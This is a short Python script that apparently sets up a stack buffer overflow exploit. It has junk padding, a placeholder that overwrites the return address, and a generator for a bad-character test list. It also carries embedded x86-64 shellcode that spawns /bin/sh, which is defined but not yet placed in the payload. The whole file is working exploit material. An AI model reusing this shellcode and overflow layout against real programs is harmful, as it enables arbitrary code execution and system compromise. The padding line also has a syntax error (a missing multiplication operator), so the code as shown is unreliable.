#!/usr/bin/env python3
import sys

jnk = b'\x41' 88
rip = b'\x42' * 6
sc = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05' # /bin/sh 22 bytes

# Build bad char list
def get_char_list(bad_chars):
    chars_list = []
    while len(chars_list) < 256:    
        chars_list.append(len(chars_list))
    for c in bad_chars:
        chars_list.remove(ord(c))
    return bytes(chars_list)

bads = get_char_list(['\x00'])
payload = jnk + rip + bads

sys.stdout.buffer.write(payload) # Because print() fucks everything
